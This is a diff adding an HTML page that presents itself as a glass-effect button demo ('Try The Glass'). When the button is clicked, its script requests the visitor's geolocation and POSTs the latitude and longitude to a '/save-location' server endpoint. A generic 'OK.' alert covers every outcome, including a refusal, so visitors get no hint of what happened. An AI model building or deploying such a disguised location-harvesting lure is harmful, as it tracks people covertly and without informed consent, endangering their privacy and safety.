@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Press and Try</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #1f1c2c, #928dab);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Segoe UI', sans-serif;
+    }
+
+    .glass-button {
+      padding: 16px 48px;
+      font-size: 1.2rem;
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      color: #ffffff;
+      border-radius: 20px;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.4s ease;
+      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.3);
+    }
+
+    .glass-button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -75%;
+      width: 150%;
+      height: 100%;
+      background: linear-gradient(120deg, rgba(255, 255, 255, 0.3), transparent, rgba(255, 255, 255, 0.3));
+      transform: skewX(-20deg);
+      transition: 0.5s;
+    }
+
+    .glass-button:hover::before {
+      left: 100%;
+    }
+
+    .glass-button:hover {
+      border-color: rgba(255, 255, 255, 0.7);
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.3);
+      transform: scale(1.05);
+    }
+
+    .glass-button:active {
+      transform: scale(0.97);
+    }
+  </style>
+</head>
+<body>
+  <button class="glass-button" onclick="getLocation()">✨ Try The Glass</button>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendPosition, showError);
+      } else {
+        alert("OK.");
+      }
+    }
+
+    function sendPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Send the coordinates to the server
+      fetch("/save-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ latitude: lat, longitude: lon })
+      })
+      .then(response => response.text())
+      .then(data => alert("OK."))
+      .catch(error => console.error("Error:", error));
+    }
+
+    function showError(error) {
+      switch(error.code) {
+        case error.PERMISSION_DENIED:
+          alert("OK.");
+          break;
+        case error.POSITION_UNAVAILABLE:
+          alert("OK.");
+          break;
+        case error.TIMEOUT:
+          alert("OK.");
+          break;
+        case error.UNKNOWN_ERROR:
+          alert("An unknown error occurred.");
+          break;
+      }
+    }
+  </script>
+</body>
+</html>
